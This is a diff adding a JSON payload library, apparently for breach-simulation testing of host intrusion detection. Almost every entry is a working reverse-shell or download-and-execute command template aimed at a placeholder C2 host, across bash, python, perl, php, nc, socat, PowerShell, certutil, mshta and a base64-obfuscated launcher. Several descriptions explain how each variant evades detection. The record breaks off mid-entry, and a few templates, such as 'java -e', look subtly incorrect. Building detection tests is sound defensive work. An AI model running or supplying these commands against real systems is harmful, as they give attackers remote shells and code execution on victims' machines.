@@ -1,0 +1,961 @@
+[
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: bash /dev/tcp",
+    "payload_external_id": "HIDS-REVERSESHELL-001",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "经典 bash 内置 TCP socket 反弹到 C2。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "bash -c 'bash -i >& /dev/tcp/{{C2_HOST}}/{{C2_PORT}} 0>&1'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:bash",
+      "tcp_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: python pty.spawn",
+    "payload_external_id": "HIDS-REVERSESHELL-002",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "python pty.spawn 起交互式反弹 shell（绕过非交互终端限制）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.006"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{{C2_HOST}}\",{{C2_PORT}}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:python3",
+      "tcp_outbound:{{C2_HOST}}:{{C2_PORT}}",
+      "tty_alloc"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: perl reverse shell",
+    "payload_external_id": "HIDS-REVERSESHELL-003",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "perl IO::Socket::INET 反弹。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.006"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "perl -e 'use Socket;$i=\"{{C2_HOST}}\";$p={{C2_PORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:perl",
+      "tcp_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: php shell_exec",
+    "payload_external_id": "HIDS-REVERSESHELL-004",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "PHP shell_exec 通过 bash 反弹。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "php -r '$sock=fsockopen(\"{{C2_HOST}}\",{{C2_PORT}});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:php",
+      "tcp_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: ruby reverse shell",
+    "payload_external_id": "HIDS-REVERSESHELL-005",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "ruby TCPSocket 反弹（常见在 RoR 主机）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "ruby -rsocket -e 'f=TCPSocket.open(\"{{C2_HOST}}\",{{C2_PORT}}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:ruby",
+      "tcp_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: nc traditional -e",
+    "payload_external_id": "HIDS-REVERSESHELL-006",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "GNU netcat-traditional 带 -e 直接反弹。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "nc -e /bin/sh {{C2_HOST}} {{C2_PORT}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:nc",
+      "tcp_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: nc BSD mkfifo",
+    "payload_external_id": "HIDS-REVERSESHELL-007",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "BSD/macOS netcat 无 -e 时用 mkfifo + cat 实现反弹。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{C2_HOST}} {{C2_PORT}} >/tmp/f",
+    "hids_artifact_path": "/tmp/f",
+    "hids_expected_artifacts": [
+      "proc:nc",
+      "fifo:/tmp/f",
+      "tcp_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: socat pty",
+    "payload_external_id": "HIDS-REVERSESHELL-008",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "socat 完整 PTY 反弹（绕过交互检测）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "socat TCP:{{C2_HOST}}:{{C2_PORT}} EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:socat",
+      "pty_alloc",
+      "tcp_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: awk system",
+    "payload_external_id": "HIDS-REVERSESHELL-009",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "awk 内置 system 反弹（少用，绕过简单命令黑名单）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "awk 'BEGIN {s = \"/inet/tcp/0/{{C2_HOST}}/{{C2_PORT}}\"; while(42) { do{ printf \"> \" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:awk",
+      "tcp_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: lua reverse shell",
+    "payload_external_id": "HIDS-REVERSESHELL-010",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "lua-socket 反弹（嵌入式 / OpenWrt 常用）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "lua -e 'local s=require(\"socket\");local t=assert(s.connect(\"{{C2_HOST}}\",{{C2_PORT}}));while true do local r=t:receive();local f=assert(io.popen(r,\"r\"));local o=f:read(\"*a\");t:send(o);end;'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:lua",
+      "tcp_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: telnet pipe",
+    "payload_external_id": "HIDS-REVERSESHELL-011",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "双 telnet 拼 stdin/stdout 反弹（无 nc 环境）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "TF=$(mktemp -u);mkfifo $TF && telnet {{C2_HOST}} {{C2_PORT}} 0<$TF | /bin/sh 1>$TF",
+    "hids_artifact_path": "$TF",
+    "hids_expected_artifacts": [
+      "proc:telnet",
+      "fifo",
+      "tcp_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: openssl s_client",
+    "payload_external_id": "HIDS-REVERSESHELL-012",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "openssl s_client 通过 TLS 隧道反弹（流量加密绕过 IDS）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1573.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "mkfifo /tmp/s;/bin/sh -i </tmp/s 2>&1|openssl s_client -quiet -connect {{C2_HOST}}:{{C2_PORT}} >/tmp/s;rm /tmp/s",
+    "hids_artifact_path": "/tmp/s",
+    "hids_expected_artifacts": [
+      "proc:openssl",
+      "tls_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: xterm display",
+    "payload_external_id": "HIDS-REVERSESHELL-013",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "xterm 通过 X11 反向连接（需 C2 端 xhost +）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "xterm -display {{C2_HOST}}:{{C2_PORT}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:xterm",
+      "x11_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: nodejs net.Socket",
+    "payload_external_id": "HIDS-REVERSESHELL-014",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Node.js net.Socket + child_process.spawn 反弹。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "node -e 'var c=require(\"child_process\").spawn(\"/bin/sh\"),n=require(\"net\").connect({{C2_PORT}},\"{{C2_HOST}}\");c.stdout.pipe(n);c.stderr.pipe(n);n.pipe(c.stdin);'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:node",
+      "tcp_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: golang reverse",
+    "payload_external_id": "HIDS-REVERSESHELL-015",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Go 编译反弹 implant（静态 binary）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "{{IMPLANT_PATH}} -lhost {{C2_HOST}} -lport {{C2_PORT}}",
+    "hids_artifact_path": "{{IMPLANT_PATH}}",
+    "hids_expected_artifacts": [
+      "proc:implant",
+      "tcp_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: msfvenom linux x64",
+    "payload_external_id": "HIDS-REVERSESHELL-016",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "msfvenom 生成 ELF reverse_tcp 落盘 + 执行。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1219"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={{C2_HOST}} LPORT={{C2_PORT}} -f elf -o /tmp/rev && chmod +x /tmp/rev && /tmp/rev",
+    "hids_artifact_path": "/tmp/rev",
+    "hids_expected_artifacts": [
+      "file_create:/tmp/rev",
+      "proc:/tmp/rev",
+      "tcp_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: powershell tcp client",
+    "payload_external_id": "HIDS-REVERSESHELL-017",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Powershell TCPClient 一句话反弹（PSv2+）。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{{C2_HOST}}',{{C2_PORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sbb=$sb+'PS '+(pwd).Path+'> ';$sbb2=([text.encoding]::ASCII).GetBytes($sbb);$s.Write($sbb2,0,$sbb2.Length);$s.Flush()};$c.Close()\"",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:powershell.exe",
+      "tcp_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: cmd.exe nc.exe",
+    "payload_external_id": "HIDS-REVERSESHELL-018",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Windows 上下载并执行 nc.exe 反弹。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "cmd.exe /c \"nc.exe -e cmd.exe {{C2_HOST}} {{C2_PORT}}\"",
+    "hids_artifact_path": "nc.exe",
+    "hids_expected_artifacts": [
+      "proc:nc.exe",
+      "tcp_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: certutil download + run",
+    "payload_external_id": "HIDS-REVERSESHELL-019",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "certutil 下载 reverse shell payload 后执行。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1105"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "certutil -urlcache -split -f http://{{C2_HOST}}/rev.exe %TEMP%\\\\rev.exe && %TEMP%\\\\rev.exe",
+    "hids_artifact_path": "%TEMP%\\rev.exe",
+    "hids_expected_artifacts": [
+      "proc:certutil.exe",
+      "http_outbound:{{C2_HOST}}",
+      "file_create:%TEMP%\\rev.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: mshta vbscript",
+    "payload_external_id": "HIDS-REVERSESHELL-020",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "mshta.exe 启动 VBScript 反弹（LOLBAS 经典）。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1218.005"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://{{C2_HOST}}/r.ps1')\"\",0:close\")",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:mshta.exe",
+      "proc:cmd.exe",
+      "http_outbound:{{C2_HOST}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: hta file",
+    "payload_external_id": "HIDS-REVERSESHELL-021",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "落盘 .hta 文件触发反弹（社工 + LOLBAS）。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1218.005"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "powershell -c \"iwr http://{{C2_HOST}}/rev.hta -OutFile %TEMP%\\\\r.hta\";mshta %TEMP%\\\\r.hta",
+    "hids_artifact_path": "%TEMP%\\r.hta",
+    "hids_expected_artifacts": [
+      "file_create:%TEMP%\\r.hta",
+      "proc:mshta.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: java Runtime exec",
+    "payload_external_id": "HIDS-REVERSESHELL-022",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Java Runtime.exec 启动反弹（Tomcat / Jetty 上下文）。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "java -e 'Runtime.getRuntime().exec(new String[]{\"bash\",\"-c\",\"bash -i >& /dev/tcp/{{C2_HOST}}/{{C2_PORT}} 0>&1\"})'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:java",
+      "proc:bash",
+      "tcp_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: /dev/udp variant",
+    "payload_external_id": "HIDS-REVERSESHELL-023",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "bash /dev/udp 反弹（绕过仅匹配 TCP 出向告警）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "bash -c '/bin/bash -i >& /dev/udp/{{C2_HOST}}/{{C2_PORT}} 0>&1'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:bash",
+      "udp_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: base64 encoded launcher",
+    "payload_external_id": "HIDS-REVERSESHELL-024",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "base64 编码 reverse-shell 一句话规避字符串匹配。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1027"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "reverse_shell"
+    ],
+    "hids_category": "reverse_shell",
+    "hids_execution_mode": "command",
+    "hids_command_template": "echo YmFzaCAtaSA+JiAvZGV2L3RjcC97e0MyX0hPU1R9fS97e0MyX1BPUlR9fSAwPiYx | base64 -d | bash",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:bash",
+      "tcp_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Reverse Shell: exec via env -i",
+    "payload_external_id": "HIDS-REVERSESHELL-025",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "env -i 清环境 + 反弹（绕过基于环境变量的拦截）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
